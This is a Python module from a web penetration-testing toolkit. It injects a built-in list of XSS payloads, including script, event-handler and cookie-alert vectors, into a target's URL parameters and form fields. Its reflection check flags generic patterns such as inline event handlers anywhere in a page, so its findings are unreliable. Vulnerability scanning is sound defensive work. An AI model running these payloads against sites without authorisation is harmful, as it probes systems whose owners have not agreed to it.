"""
XSS (Cross-Site Scripting) Scanner Tool
Developer: Sanad.CodeX
VOIDEX - Web Penetration Testing Toolkit
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from core import HTTPClient, Logger, Validator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from typing import List, Dict, Tuple
from tqdm import tqdm
import time
import re


class XSSScanner:
    """Scanner for XSS vulnerabilities."""
    
    def __init__(self, logger: Logger, http_client: HTTPClient):
        self.logger = logger
        self.http_client = http_client
        self.payloads = self._load_payloads()
        self.vulnerabilities = []
    
    def _load_payloads(self) -> List[str]:
        """Load XSS payloads."""
        payload_file = os.path.join(
            os.path.dirname(__file__), 
            'payloads.txt'
        )
        
        if os.path.exists(payload_file):
            with open(payload_file, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        # Default payloads if file doesn't exist
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
        ]
    
    def _extract_forms(self, html: str, base_url: str) -> List[Dict]:
        """Extract forms from HTML."""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            
            # Make action URL absolute
            if form_details['action']:
                if not form_details['action'].startswith('http'):
                    parsed_base = urlparse(base_url)
                    if form_details['action'].startswith('/'):
                        form_details['action'] = f"{parsed_base.scheme}://{parsed_base.netloc}{form_details['action']}"
                    else:
                        form_details['action'] = f"{base_url.rstrip('/')}/{form_details['action']}"
            else:
                form_details['action'] = base_url
            
            # Extract input fields
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name')
                input_value = input_tag.get('value', '')
                
                if input_name:
                    form_details['inputs'].append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
            
            forms.append(form_details)
        
        return forms
    
    def _test_url_parameter(self, url: str, payload: str) -> Tuple[bool, str]:
        """Test XSS in URL parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return False, ""
        
        for param in params:
            modified_params = params.copy()
            modified_params[param] = [payload]
            
            new_query = urlencode(modified_params, doseq=True)
            modified_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            response = self.http_client.get(modified_url)
            if response and self._check_xss_reflection(response.text, payload):
                return True, f"Parameter: {param}"
        
        return False, ""
    
    def _test_form(self, form: Dict, payload: str) -> Tuple[bool, str]:
        """Test XSS in form inputs."""
        form_data = {}
        vulnerable_field = None
        
        # Try payload in each input field
        for input_field in form['inputs']:
            if input_field['type'] not in ['submit', 'button', 'reset']:
                test_data = {}
                for inp in form['inputs']:
                    if inp['name'] == input_field['name']:
                        test_data[inp['name']] = payload
                    else:
                        test_data[inp['name']] = inp['value'] or 'test'
                
                if form['method'] == 'post':
                    response = self.http_client.post(form['action'], data=test_data)
                else:
                    response = self.http_client.get(form['action'], params=test_data)
                
                if response and self._check_xss_reflection(response.text, payload):
                    return True, f"Form field: {input_field['name']}"
        
        return False, ""
    
    def _check_xss_reflection(self, response: str, payload: str) -> bool:
        """Check if payload is reflected in response."""
        # Check for exact payload match
        if payload in response:
            return True
        
        # Check for decoded/encoded versions
        payload_lower = payload.lower()
        response_lower = response.lower()
        
        # Check for common XSS patterns
        xss_patterns = [
            r'<script[^>]*>.*?alert.*?</script>',
            r'<img[^>]*onerror[^>]*>',
            r'<svg[^>]*onload[^>]*>',
            r'<iframe[^>]*src[^>]*javascript:',
            r'on\w+\s*=',
            r'javascript:',
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, response_lower, re.IGNORECASE):
                return True
        
        return False
    
    def scan(self, url: str, scan_forms: bool = True) -> Dict:
        """Scan a URL for XSS vulnerabilities."""
        self.logger.section("XSS SCANNER")
        self.logger.info(f"Target: {url}")
        
        if not Validator.is_valid_url(url):
            self.logger.error("Invalid URL format")
            return {'vulnerable': False, 'vulnerabilities': []}
        
        vulnerabilities = []
        
        # Get the page content
        response = self.http_client.get(url)
        if not response:
            self.logger.error("Failed to fetch the target URL")
            return {'vulnerable': False, 'vulnerabilities': []}
        
        # Test URL parameters
        parsed = urlparse(url)
        if parsed.query:
            self.logger.info("Testing URL parameters...")
            with tqdm(total=len(self.payloads), desc="URL Params", 
                     bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
                for payload in self.payloads:
                    is_vuln, location = self._test_url_parameter(url, payload)
                    if is_vuln:
                        vuln_info = {
                            'type': 'URL Parameter',
                            'location': location,
                            'payload': payload
                        }
                        vulnerabilities.append(vuln_info)
                        self.logger.vuln(f"XSS found in {location}: {payload[:50]}")
                    pbar.update(1)
                    time.sleep(0.1)
        
        # Test forms if requested
        if scan_forms:
            forms = self._extract_forms(response.text, url)
            if forms:
                self.logger.info(f"Found {len(forms)} forms to test...")
                for idx, form in enumerate(forms):
                    self.logger.info(f"Testing form {idx + 1}/{len(forms)}...")
                    with tqdm(total=len(self.payloads), desc=f"Form {idx+1}", 
                             bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
                        for payload in self.payloads:
                            is_vuln, location = self._test_form(form, payload)
                            if is_vuln:
                                vuln_info = {
                                    'type': 'Form Input',
                                    'location': location,
                                    'payload': payload,
                                    'form_action': form['action']
                                }
                                vulnerabilities.append(vuln_info)
                                self.logger.vuln(f"XSS found in {location}: {payload[:50]}")
                            pbar.update(1)
                            time.sleep(0.1)
        
        if vulnerabilities:
            self.logger.success(f"Found {len(vulnerabilities)} XSS vulnerabilities")
            return {
                'vulnerable': True,
                'vulnerabilities': vulnerabilities,
                'url': url
            }
        else:
            self.logger.info("No XSS vulnerabilities detected")
            return {'vulnerable': False, 'vulnerabilities': []}


def run(args, config):
    """Run XSS scanner."""
    from core import Config
    
    cfg = Config(config if config else 'config.yaml')
    logger = Logger("XSS Scanner", args.output if hasattr(args, 'output') else None)
    http_client = HTTPClient(
        timeout=cfg.get('timeout'),
        verify_ssl=cfg.get('verify_ssl'),
        user_agents=cfg.get('user_agents')
    )
    
    scanner = XSSScanner(logger, http_client)
    scan_forms = getattr(args, 'forms', True)
    result = scanner.scan(args.url, scan_forms)
    
    # Save results if output file specified
    if hasattr(args, 'output') and args.output and result['vulnerable']:
        import json
        with open(args.output, 'w') as f:
            json.dump(result, f, indent=4)
        logger.success(f"Results saved to {args.output}")
    
    http_client.close()
    return result
